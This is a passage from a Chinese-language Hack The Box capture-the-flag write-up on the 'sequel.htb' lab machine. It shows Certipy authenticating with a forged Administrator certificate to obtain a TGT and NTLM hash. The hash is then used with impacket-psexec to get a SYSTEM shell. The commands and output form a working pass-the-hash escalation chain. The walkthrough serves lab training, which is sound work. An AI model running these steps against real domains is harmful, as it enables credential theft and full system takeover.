[*] Request ID is 34
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'Administrator.pfx.pfx'
```
> 成功匯出憑證
#### 10.4 Certipy 認證取得 Admin TGT / hash
使用偽造好的 `Administrator.pfx` 憑證，向 KDC 認證取得 Kerberos TGT 與 NTLM hash
```
┌──(chw㉿CHW)-[~]
└─$ mv Administrator.pfx.pfx Administrator.pfx

┌──(chw㉿CHW)-[~]
└─$ certipy auth \
  -pfx Administrator.pfx \
  -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e...e5a0b3ff

```
> 成功取得 administrator NTLM hash

#### 10.5 SYSTEM Shell
以 Admin hash 拿 SYSTEM shell
```
┌──(chw㉿CHW)-[~]
└─$ impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes 'aad3b435b51404eeaad3b435b51404ee:7a8d4e...e5a0b3ff'
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.51.....
[-] share 'Accounting Department' is not writable.
[*] Found writable share ADMIN$
[*] Uploading file sjIYOWbL.exe
[*] Opening SVCManager on 10.10.11.51.....
[*] Creating service VHxq on 10.10.11.51.....
[*] Starting service VHxq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6640]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/Hy_CB0Kxxl.png)

###### tags: `HTB` `Web` `CTF` `Windows`
